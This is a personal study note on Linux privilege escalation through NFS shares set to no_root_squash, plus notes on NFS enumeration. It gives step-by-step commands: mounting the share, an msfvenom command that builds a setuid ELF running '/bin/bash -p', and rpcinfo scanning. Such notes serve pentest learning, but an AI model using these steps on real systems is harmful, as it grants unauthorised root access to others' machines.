
2024-06-16 13:06

Source: #privesc 

Tags: [[linux]]

##### Root Squashing

- Root Squashing is how NFS prevents an obvious privilege escalation. 
- If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group. 
- While this behavior is default, it can be disabled
##### no_root_squash

- no_root_squash is an NFS configuration option which turns root squashing off.
- When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.

##### Example : 

**Adversary machine**

- view contents of `/etc/exports`
- find for shares that are configured with the no_root_squash option (in the example we have /tmp) meaning we can write files to it as the root user over NFS

**Local Machine**

check if tmp share is available to mount 
```
$ showmount -e <targetip>
Export list for <targetip>
/tmp *
```
Create a directory that will be used as a mount point for the NFS share
```
mkdir /tmp/nfs

then mount the nfs share 
mount -o rw,vers=2 <targetip>:/tmp /tmp/nfs
```
Generate a [[msfvenom]] executable which runs bash with -p option and save this to the nfs share 
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
Note that i am doing this as root user so the file should also be owned by root on the nfs share 
```
make it executable - 
chmod +xs /tmp/nfs/shell.elf
```
##### Adversary machine

check `/tmp` directory for shell.elf and execute it
### Enumeration 

NFS is a type of file system that enables users to access, view, store, and update files over a remote server. These remote data can be accessed by the client in the same way it is accessed on the local system. Depending on the privileges assigned to the clients, they can either only read or both read and write the data. 

An NFS system is generally implemented on a computer network in which the centralization of data is required for critical resources. The remote procedure call (RPC) is used to route and process the request between clients and servers. 

To accomplish the task of sharing files and directories over the network, the "exporting" process is used. However, the client first attempts to make the file available for sharing by using the "mounting" process. 
- The `/etc/exports` location on the NFS server contains a list of clients allowed to share files on the server. In this approach, to access the server, the only credential used is the client's IP address.
- NFS versions before version 4 run on the same security specification. 

Enumerating NFS services enables attackers to identify the exported directories, list of clients connected to the NFS server along with their IP addresses, and the shared data associated with the IP addresses. After gathering this information, the attackers can spoof their IP addresses to gain full access to the shared files on the server.

As shown in the screenshot, an attacker runs the following `rpcinfo` command to scan the target IP address for an open NFS port (port 2049) and the NFS services running on it: 
`rpcinfo -p <Target IP Address>`
#### Enum Tools

[GitHub - hegusung/RPCScan: Tool to communicate with RPC services and check misconfigurations on NFS shares](https://github.com/hegusung/RPCScan)
[GitHub - p4pentest/SuperEnum: This script does the basic enumeration of any open port along with screenshots.](https://github.com/p4pentest/SuperEnum)


### References
